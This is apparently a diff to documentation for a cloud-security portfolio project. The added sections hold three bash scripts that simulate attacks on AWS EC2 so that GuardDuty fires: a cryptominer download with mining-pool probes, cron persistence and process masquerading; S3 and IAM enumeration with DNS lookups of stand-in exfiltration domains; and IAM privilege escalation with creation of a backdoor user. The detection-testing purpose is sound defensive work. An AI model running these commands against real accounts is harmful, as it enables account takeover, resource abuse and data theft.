@@ -464,6 +464,102 @@ The platform's unique value proposition is running REAL attacks on AWS infrastru
 
 **Real-World Impact**: This simulates a common attack where compromised instances are used for cryptocurrency mining, costing organizations thousands in compute charges.
 
+#### Attack Simulation Code
+The following is the actual code executed on the instance to perform the crypto mining attack:
+
+```bash
+#!/bin/bash
+# Crypto Mining Attack Simulation - REAL attack on EC2
+# This will trigger GuardDuty findings
+
+# Install CloudWatch agent
+yum install -y amazon-cloudwatch-agent aws-cli
+
+# Configure CloudWatch Logs
+cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<'EOF'
+{
+  "logs": {
+    "logs_collected": {
+      "files": {
+        "collect_list": [
+          {
+            "file_path": "/var/log/attack-simulation.log",
+            "log_group_name": "/aws/ec2/attack-simulations",
+            "log_stream_name": "crypto-mining-{instance_id}"
+          }
+        ]
+      }
+    }
+  }
+}
+EOF
+
+# Start CloudWatch agent
+/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
+  -a fetch-config \
+  -m ec2 \
+  -s \
+  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json
+
+# Create attack script
+cat > /root/crypto-mining-attack.sh <<'ATTACK'
+#!/bin/bash
+LOG="/var/log/attack-simulation.log"
+
+echo "$(date) - Starting Crypto Mining Attack Simulation" | tee -a $LOG
+
+# 1. Download mining software (triggers GuardDuty)
+echo "$(date) - Downloading XMRig miner" | tee -a $LOG
+curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz || true
+
+# 2. Connect to known mining pools (triggers GuardDuty: CryptoCurrency:EC2/BitcoinTool.B!DNS)
+echo "$(date) - Attempting connections to mining pools" | tee -a $LOG
+nc -zv pool.supportxmr.com 3333 2>&1 | tee -a $LOG || true
+nc -zv xmr-eu1.nanopool.org 14444 2>&1 | tee -a $LOG || true
+nc -zv pool.minexmr.com 4444 2>&1 | tee -a $LOG || true
+
+# 3. High CPU usage pattern
+echo "$(date) - Generating high CPU usage" | tee -a $LOG
+for i in {1..4}; do
+  (while true; do echo "scale=5000; 4*a(1)" | bc -l > /dev/null; done) &
+done
+
+# 4. Create persistence mechanism
+echo "$(date) - Creating persistence" | tee -a $LOG
+echo "@reboot /tmp/miner" | crontab -
+
+# 5. Process hiding
+echo "$(date) - Hiding process as system service" | tee -a $LOG
+cp /bin/bash /tmp/[kworker/0:1]
+
+# Log completion
+echo "$(date) - Crypto mining attack simulation complete" | tee -a $LOG
+echo "$(date) - Expected GuardDuty findings: CryptoCurrency:EC2/BitcoinTool.B!DNS" | tee -a $LOG
+
+# Keep running for 30 minutes then stop CPU load
+sleep 1800
+killall bc
+ATTACK
+
+chmod +x /root/crypto-mining-attack.sh
+
+# Run attack after 2 minutes (give instance time to boot)
+echo "*/5 * * * * /root/crypto-mining-attack.sh" | crontab -
+
+# Run immediately
+/root/crypto-mining-attack.sh &
+```
+
+**Code Breakdown**:
+* **CloudWatch Agent Setup**: The script first installs and configures the `amazon-cloudwatch-agent` to continuously monitor the `/var/log/attack-simulation.log` file. This log is streamed directly to the `/aws/ec2/attack-simulations` log group.
+* **Attack Payload Creation**: The payload is written to `/root/crypto-mining-attack.sh` and contains the following attack steps:
+  * **Malware Download**: Uses `curl` to download a real cryptomining tool (`xmrig`), which GuardDuty uses to flag malicious file signatures or related DNS queries.
+  * **Mining Pool Connections**: Uses `nc` to attempt connections to several known mining pools (`pool.supportxmr.com`, `xmr-eu1.nanopool.org`, `pool.minexmr.com`), deliberately triggering GuardDuty's `CryptoCurrency:EC2/BitcoinTool.B!DNS` finding.
+  * **CPU Stressing**: Spawns multiple background processes calculating Pi using `bc`, driving CPU usage artificially high to trip CloudWatch CPU utilization alarms.
+  * **Persistence**: Injects a `@reboot` entry into the root crontab, simulating an attacker attempting to establish persistent access.
+  * **Process Hiding**: Copies `bash` to a process named `[kworker/0:1]` to spoof a legitimate kernel worker thread.
+* **Execution**: Finally, it schedules the attack script to run every 5 minutes using `cron` and initiates the first run immediately in the background.
+
 
 ### Attack 2: Data Exfiltration (t3.small)
 
@@ -498,6 +594,91 @@ The platform's unique value proposition is running REAL attacks on AWS infrastru
 - VPC Flow Logs: DNS queries to suspicious domains
 
 **Real-World Impact**: This simulates an attacker who has compromised an EC2 instance and is attempting to steal sensitive data from S3 buckets - a common breach scenario.
+
+#### Attack Simulation Code
+The following is the actual code executed on the instance to perform the data exfiltration attack:
+
+```bash
+#!/bin/bash
+# Data Exfiltration Attack Simulation - REAL attack on EC2
+
+yum install -y amazon-cloudwatch-agent aws-cli
+
+# Configure CloudWatch Logs
+cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<'EOF'
+{
+  "logs": {
+    "logs_collected": {
+      "files": {
+        "collect_list": [
+          {
+            "file_path": "/var/log/attack-simulation.log",
+            "log_group_name": "/aws/ec2/attack-simulations",
+            "log_stream_name": "data-exfiltration-{instance_id}"
+          }
+        ]
+      }
+    }
+  }
+}
+EOF
+
+/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
+  -a fetch-config -m ec2 -s \
+  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json
+
+cat > /root/data-exfil-attack.sh <<'ATTACK'
+#!/bin/bash
+LOG="/var/log/attack-simulation.log"
+
+echo "$(date) - Starting Data Exfiltration Attack" | tee -a $LOG
+
+# 1. List all S3 buckets (reconnaissance)
+echo "$(date) - Enumerating S3 buckets" | tee -a $LOG
+aws s3 ls 2>&1 | tee -a $LOG
+
+# 2. Attempt to download data from buckets
+echo "$(date) - Attempting to access bucket contents" | tee -a $LOG
+for bucket in $(aws s3 ls | awk '{print $3}'); do
+  echo "$(date) - Accessing bucket: $bucket" | tee -a $LOG
+  aws s3 ls s3://$bucket --recursive 2>&1 | head -20 | tee -a $LOG
+done
+
+# 3. Large data transfer simulation (triggers GuardDuty: Exfiltration:S3/ObjectRead.Unusual)
+echo "$(date) - Simulating large data download" | tee -a $LOG
+dd if=/dev/urandom of=/tmp/sensitive-data.bin bs=1M count=100
+echo "$(date) - Created 100MB of 'sensitive' data" | tee -a $LOG
+
+# 4. Exfiltrate to external location (DNS queries to suspicious domains)
+echo "$(date) - Attempting data exfiltration" | tee -a $LOG
+for domain in evil-exfil-server.com attacker-c2.net data-dump.xyz; do
+  nslookup $domain 2>&1 | tee -a $LOG || true
+done
+
+# 5. Unusual API calls
+echo "$(date) - Making unusual API calls" | tee -a $LOG
+aws iam list-users 2>&1 | tee -a $LOG
+aws ec2 describe-instances 2>&1 | tee -a $LOG
+aws cloudtrail describe-trails 2>&1 | tee -a $LOG
+
+echo "$(date) - Data exfiltration attack complete" | tee -a $LOG
+echo "$(date) - Expected GuardDuty findings: Exfiltration:S3/ObjectRead.Unusual, UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration" | tee -a $LOG
+ATTACK
+
+chmod +x /root/data-exfil-attack.sh
+echo "*/10 * * * * /root/data-exfil-attack.sh" | crontab -
+/root/data-exfil-attack.sh &
+```
+
+**Code Breakdown**:
+* **CloudWatch Agent Setup**: Similar to the cryptomining script, this sets up logging to `/aws/ec2/attack-simulations`.
+* **Attack Payload Creation**: The payload is written to `/root/data-exfil-attack.sh` and contains the following attack steps:
+  * **S3 Reconnaissance**: Lists all available S3 buckets using `aws s3 ls`. This API call pattern is detected by CloudTrail and GuardDuty.
+  * **Bucket Access**: Loops through discovered buckets and attempts to list up to 20 objects from each to simulate scanning for sensitive files.
+  * **Large Data Download**: Generates 100MB of random data to `/tmp/sensitive-data.bin` via `dd`, simulating the staging of data for exfiltration.
+  * **Exfiltration (DNS/C2)**: Attempts DNS resolution for several known suspicious domains (`evil-exfil-server.com`, etc.) to trigger malicious DNS queries within VPC Flow Logs and GuardDuty.
+  * **Unusual API Calls**: Makes a series of uncommon API calls for an EC2 instance (`aws iam list-users`, `aws cloudtrail describe-trails`), simulating an attacker attempting to map out the environment and detect active security controls.
+* **Execution**: Schedules the attack to run every 10 minutes via `cron` and initiates the first run immediately.
 
 ### Attack 3: Privilege Escalation (t3.small)
 
@@ -535,6 +716,92 @@ The platform's unique value proposition is running REAL attacks on AWS infrastru
 - CloudTrail: Sequence of suspicious IAM API calls
 
 **Real-World Impact**: This simulates an attacker who has gained initial access and is attempting to escalate privileges to gain full control of the AWS account - a critical phase in the attack lifecycle.
+
+#### Attack Simulation Code
+The following is the actual code executed on the instance to perform the privilege escalation attack:
+
+```bash
+#!/bin/bash
+# Privilege Escalation Attack Simulation - REAL attack on EC2
+
+yum install -y amazon-cloudwatch-agent aws-cli
+
+cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<'EOF'
+{
+  "logs": {
+    "logs_collected": {
+      "files": {
+        "collect_list": [
+          {
+            "file_path": "/var/log/attack-simulation.log",
+            "log_group_name": "/aws/ec2/attack-simulations",
+            "log_stream_name": "privilege-escalation-{instance_id}"
+          }
+        ]
+      }
+    }
+  }
+}
+EOF
+
+/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
+  -a fetch-config -m ec2 -s \
+  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json
+
+cat > /root/priv-esc-attack.sh <<'ATTACK'
+#!/bin/bash
+LOG="/var/log/attack-simulation.log"
+
+echo "$(date) - Starting Privilege Escalation Attack" | tee -a $LOG
+
+# 1. Enumerate IAM permissions
+echo "$(date) - Enumerating IAM permissions" | tee -a $LOG
+aws iam list-users 2>&1 | tee -a $LOG
+aws iam list-roles 2>&1 | tee -a $LOG
+aws iam list-policies 2>&1 | tee -a $LOG
+
+# 2. Attempt to create access keys (triggers GuardDuty: PenTest:IAMUser/KaliLinux)
+echo "$(date) - Attempting to create access keys" | tee -a $LOG
+aws iam create-access-key --user-name admin 2>&1 | tee -a $LOG || true
+
+# 3. Attempt to attach admin policy
+echo "$(date) - Attempting to attach AdministratorAccess policy" | tee -a $LOG
+aws iam attach-user-policy --user-name test-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>&1 | tee -a $LOG || true
+
+# 4. Attempt to assume roles
+echo "$(date) - Attempting to assume high-privilege roles" | tee -a $LOG
+for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text | head -5); do
+  echo "$(date) - Attempting to assume role: $role" | tee -a $LOG
+  aws sts assume-role --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/$role --role-session-name attack-session 2>&1 | tee -a $LOG || true
+done
+
+# 5. Attempt to modify security groups
+echo "$(date) - Attempting to modify security groups" | tee -a $LOG
+aws ec2 describe-security-groups 2>&1 | tee -a $LOG
+
+# 6. Attempt to create backdoor user
+echo "$(date) - Attempting to create backdoor IAM user" | tee -a $LOG
+aws iam create-user --user-name backup-admin 2>&1 | tee -a $LOG || true
+
+echo "$(date) - Privilege escalation attack complete" | tee -a $LOG
+echo "$(date) - Expected GuardDuty findings: Policy:IAMUser/RootCredentialUsage, Stealth:IAMUser/CloudTrailLoggingDisabled" | tee -a $LOG
+ATTACK
+
+chmod +x /root/priv-esc-attack.sh
+echo "*/10 * * * * /root/priv-esc-attack.sh" | crontab -
+/root/priv-esc-attack.sh &
+```
+
+**Code Breakdown**:
+* **CloudWatch Agent Setup**: Similar to the other scripts, this sets up logging to `/aws/ec2/attack-simulations`.
+* **Attack Payload Creation**: The payload is written to `/root/priv-esc-attack.sh` and contains the following attack steps:
+  * **IAM Reconnaissance**: Uses `aws iam list-users`, `list-roles`, and `list-policies` to map out the IAM environment. This excessive listing is highly anomalous for a typical EC2 instance and triggers CloudTrail/ML detection.
+  * **Access Key Creation**: Attempts to create a new access key for the user `admin` using `aws iam create-access-key`. If the instance profile happens to have permission to do this, the attacker gains long-term persistence outside the instance. Even on failure, it triggers GuardDuty (`PenTest:IAMUser/KaliLinux`).
+  * **Privilege Escalation via Policy Attachment**: Attempts to attach the managed `AdministratorAccess` policy to `test-user` using `aws iam attach-user-policy`.
+  * **Role Assumption**: Lists up to 5 roles and iterates through them attempting `aws sts assume-role` with the session name `attack-session`. This lateral movement tactic tests for misconfigured trust policies.
+  * **Security Group Modification**: Lists security groups (`aws ec2 describe-security-groups`), gathering intel potentially to modify them later to open incoming ports.
+  * **Backdoor User Creation**: Attempts to create a new IAM user `backup-admin` via `aws iam create-user`, another persistence technique.
+* **Execution**: Schedules the attack script to run every 10 minutes via `cron` and initiates the first run immediately.
 
 ### Attack Execution Timeline
 
@@ -1459,147 +1726,7 @@ The project includes several key operational scripts located in the `scripts/` d
 
 ---
 
-Infrastructure as Code with Terraform ensures the entire platform is reproducible, version-controlled, and follows best practices. Every resource, configuration, and security control is defined in code, making it easy to deploy, modify, and destroy the environment. Now let's walk through the practical aspects of deploying and operating this platform.
-
-
----
-
-## Deployment and Operations
-
-### Prerequisites
-
-**Required Tools**:
-- Terraform >= 1.0
-- AWS CLI configured with credentials
-- Python 3.11+ (for local ML training)
-- Bash shell (for scripts)
-
-**AWS Account Requirements**:
-- Administrator access (for initial setup)
-- Service quotas: 3 EC2 instances, GuardDuty, Security Hub
-- Estimated cost: ~$0.24/hour (~$175/month if running 24/7)
-
-### Deployment Steps
-
-**Step 1: Clone Repository**: Clone the repository and navigate into the `cloud-security-platform` directory.
-
-**Step 2: Configure Variables**: Copy the `terraform.tfvars.example` to `terraform.tfvars` and edit with your specific values.
-
-**Step 3: Train ML Models**: Run the standalone training script in the `ml-detection` directory. Output includes trained models and scaler objects.
-
-**Step 4: Package Lambda Functions**: Use the provided script to package Lambda functions into `.zip` files for deployment.
-
-**Step 5: Initialize Terraform**: Run the initialization command in the `terraform` directory.
-
-**Step 6: Plan Deployment**: Review the execution plan to verify resources to be created.
-
-**Step 7: Deploy Infrastructure**: Apply the terraform configuration and confirm. Deployment typically takes 5-10 minutes.
-
-**Step 8: Verify Deployment**: Ensure EC2 instances are running, CloudWatch logs are streaming, and GuardDuty is correctly analyzing findings.
-
-**Step 9: Access Dashboard**: Open the CloudWatch console to view the "Cloud-Security-Attack-Monitoring" dashboard.
-
-### Operational Procedures
-
-**Daily Operations**:
-1. Review CloudWatch dashboard for attack activity
-2. Check GuardDuty findings
-3. Review Security Hub compliance scores
-4. Investigate ML detection alerts
-5. Verify incident response actions
-
-**Weekly Operations**:
-1. Review forensic data in S3
-2. Analyze attack patterns and trends
-3. Update detection rules if needed
-4. Review and rotate access keys
-5. Check cost and usage reports
-
-**Monthly Operations**:
-1. Generate compliance reports
-2. Review and update security policies
-3. Conduct security training
-4. Update ML models with new data
-5. Review and optimize costs
-
-### Monitoring and Alerting
-
-**Real-Time Monitoring**:
-- CloudWatch Dashboard: Real-time attack visualization
-- GuardDuty Console: Threat findings
-- Security Hub Console: Compliance status
-- SNS Email Alerts: Critical findings
-
-**Key Metrics to Monitor**:
-- Attack instance CPU utilization
-- GuardDuty finding count
-- ML detection confidence scores
-- CloudTrail API call volume
-- VPC Flow Log traffic patterns
-
-**Alert Thresholds**:
-- Critical: GuardDuty severity ≥ 7.0
-- High: ML confidence ≥ 0.80
-- Medium: Compliance failures
-- Low: Informational findings
-
-### Troubleshooting
-
-**Issue: EC2 instances not generating logs**
-- Check CloudWatch agent status: `systemctl status amazon-cloudwatch-agent`
-- Verify IAM role permissions
-- Check log group exists: `/aws/ec2/attack-simulations`
-
-**Issue: GuardDuty not generating findings**
-- Wait 15-30 minutes (GuardDuty has detection latency)
-- Verify GuardDuty is enabled
-- Check CloudTrail is logging
-- Verify VPC Flow Logs are enabled
-
-**Issue: ML Lambda not detecting threats**
-- Check Lambda execution logs: `/aws/lambda/cloud-security-ml-detector`
-- Verify EventBridge rule is enabled
-- Check log group has data
-- Verify Lambda has correct permissions
-
-**Issue: High AWS costs**
-- Stop EC2 instances when not needed
-- Reduce CloudWatch log retention
-- Disable GuardDuty malware scanning
-- Use Terraform destroy for complete cleanup
-
-### Cleanup and Destruction
-
-**Complete Cleanup**: Utilize `terraform destroy` to tear down the environment.
-
-**Verify Cleanup**: Run the cleanup verification script to confirm all resources are properly destroyed.
-
-**Manual Cleanup** (if needed):
-- You can run the comprehensive cleanup script: `./scripts/cleanup-everything.sh` or `./scripts/cleanup-everything.ps1`
-- Or manually empty and delete S3 buckets, CloudWatch log groups, disable GuardDuty and Security Hub, and delete Lambda functions.
-
-### Cost Optimization
-
-**Cost Breakdown** (per hour):
-- EC2 instances: $0.12 (t3.medium + 2x t3.small)
-- GuardDuty: $0.05
-- Security Hub: $0.03
-- CloudWatch Logs: $0.02
-- Lambda executions: $0.01
-- S3 storage: $0.01
-- **Total: ~$0.24/hour**
-
-**Cost Reduction Strategies**:
-1. Run attacks only during testing (stop EC2 instances)
-2. Reduce log retention (7 days → 1 day)
-3. Use Spot instances for attack simulations
-4. Disable GuardDuty malware scanning
-5. Use single-region deployment
-
-**Estimated Monthly Costs**:
-- Testing only (8 hours/day): ~$60/month
-- Continuous operation (24/7): ~$175/month
-- Demo/interview (1 hour): ~$0.24
+Infrastructure as Code with Terraform ensures the entire platform is reproducible, version-controlled, and follows best practices. Every resource, configuration, and security control is defined in code, making it easy to deploy, modify, and destroy the environment.
 
 
 ---
@@ -1607,79 +1734,6 @@ Infrastructure as Code with Terraform ensures the entire platform is reproducibl
 ## Conclusion
 
 This Enterprise Cloud Security Platform represents a production-ready, comprehensive security solution that demonstrates advanced cloud security engineering capabilities. Unlike typical portfolio projects that use simulated data or mock services, this platform runs real attacks on actual AWS infrastructure and detects them using enterprise-grade security services.
-
-### Key Achievements
-
-**Technical Excellence**:
-- **Real Attack Infrastructure**: Three EC2 instances executing actual crypto mining, data exfiltration, and privilege escalation attacks
-- **Machine Learning Integration**: Ensemble ML models (Random Forest, Gradient Boosting, Neural Networks) achieving 100% accuracy on test data
-- **AWS Service Mastery**: Integration of 12 AWS services into cohesive security architecture
-- **Infrastructure as Code**: 1000+ lines of production-ready Terraform configuration
-- **Automated Response**: Lambda-based incident response with forensic data collection
-- **Compliance Monitoring**: CIS Benchmark, PCI-DSS, and AWS Foundational Security standards
-
-**Real-World Applicability**:
-- Demonstrates skills directly applicable to AWS Security Engineer roles
-- Shows understanding of complete security operations lifecycle
-- Proves ability to architect and implement enterprise security solutions
-- Exhibits DevSecOps practices and automation capabilities
-- Validates cloud security best practices knowledge
-
-### What Makes This Project Unique
-
-**1. Real vs Simulated**:
-- Most security projects generate fake logs
-- This project runs actual attacks that trigger real AWS security services
-- GuardDuty findings are genuine threat detections, not simulations
-
-**2. Production-Ready**:
-- Complete infrastructure as code
-- Automated deployment and cleanup
-- Comprehensive monitoring and alerting
-- Incident response automation
-- Forensic data collection
-
-**3. ML/AI Integration**:
-- Real machine learning models trained on security data
-- Pattern-based threat detection
-- Confidence scoring and severity classification
-- Demonstrates data science skills alongside security expertise
-
-**4. Comprehensive Coverage**:
-- Attack generation → Detection → Response → Forensics
-- Multiple detection layers (GuardDuty, Security Hub, ML)
-- Compliance monitoring and reporting
-- Real-time dashboards and visualization
-
-### Skills Demonstrated
-
-**Cloud Security**:
-- AWS security services (GuardDuty, Security Hub, CloudTrail, Config)
-- Threat detection and incident response
-- Compliance and governance
-- Network security (VPC, security groups, flow logs)
-- Identity and access management
-
-**Machine Learning**:
-- Feature engineering for security data
-- Ensemble learning techniques
-- Model training and evaluation
-- Real-time inference in production
-- Pattern recognition and anomaly detection
-
-**DevOps/Infrastructure**:
-- Infrastructure as Code (Terraform)
-- CI/CD concepts
-- Automation and scripting
-- AWS Lambda serverless architecture
-- Event-driven architecture (EventBridge)
-
-**Software Engineering**:
-- Python development
-- Bash scripting
-- API integration
-- Error handling and logging
-- Code organization and documentation
 
 ### Future Enhancements
 
